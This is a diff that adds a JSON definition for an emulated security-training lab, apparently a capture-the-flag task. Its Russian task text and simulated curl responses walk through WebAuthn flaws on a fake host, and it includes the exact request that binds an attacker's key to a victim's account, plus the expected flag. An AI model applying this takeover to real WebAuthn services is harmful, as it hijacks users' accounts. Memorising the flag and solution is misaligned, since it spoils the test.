@@ -1,0 +1,58 @@
+{
+  "id": "web-webauthn",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{w3bauthn_0r1g1n_ch4ll3ng3_uv_n0t_v3r1f13d}"
+  },
+  "fs": [
+    {
+      "path": "/home/student/task",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Практика: WebAuthn — ошибки реализации\n\nЦель `id.local` — вход по passkey; сервер проверяет не всё, что обязан.\n\n1. Посмотри ответ `/webauthn/register/begin` — там `challenge`, `rp.id`, `user.id`.\n2. `/webauthn/login/finish` принимает подпись с чужим `origin` (проверки нет).\n3. Главная дыра — регистрация: `/webauthn/register/finish` не сверяет, что `user.id` принадлежит сессии.\n4. Привяжи свой ключ к аккаунту жертвы (`user.id=dXNlcl92aWN0aW0`) и сохрани ответ.\n\nФлаг: `nto{...}` в ответе успешной привязки.\n",
+      "mode": "644"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция id.local)",
+      "cases": [
+        {
+          "match": "dXNlcl92aWN0aW0",
+          "example": "-s -X POST https://id.local/webauthn/register/finish -b 'session=MY_SESSION' -d 'user.id=dXNlcl92aWN0aW0'",
+          "output": "{\"ok\":true,\"account\":\"victim@id.local\",\"flag\":\"nto{w3bauthn_0r1g1n_ch4ll3ng3_uv_n0t_v3r1f13d}\"}\n"
+        },
+        {
+          "match": "register/finish",
+          "example": "-s -X POST https://id.local/webauthn/register/finish -d @my_key.json",
+          "output": "{\"ok\":true,\"account\":\"me@id.local\"}\n"
+        },
+        {
+          "match": "register/begin",
+          "example": "-s -X POST https://id.local/webauthn/register/begin",
+          "output": "{\"challenge\":\"Xz9fQ2hhbGxlbmdl\",\"rp\":{\"id\":\"id.local\",\"name\":\"ID\"},\"user\":{\"id\":\"dXNlcl8x\",\"name\":\"me@id.local\"},\"pubKeyCredParams\":[{\"alg\":-7}]}\n"
+        },
+        {
+          "match": "login/finish",
+          "example": "-s -X POST https://id.local/webauthn/login/finish -d @login.json",
+          "output": "{\"ok\":true,\"session\":\"eyJhbGciOiJIUzI1NiJ9.FULL\"}\n"
+        },
+        {
+          "match": "/login",
+          "example": "-s -X POST https://id.local/login -d 'email=victim@id.local&password=x'",
+          "output": "{\"ok\":true}  # passkey не enforced, вход паролем разрешён\n"
+        },
+        {
+          "match": "id\\.local",
+          "example": "-s https://id.local/",
+          "output": "<!doctype html><title>id.local — passkey login</title>\n"
+        }
+      ],
+      "fallback": "curl: в этой лабе эмулируется id.local.\n"
+    }
+  }
+}
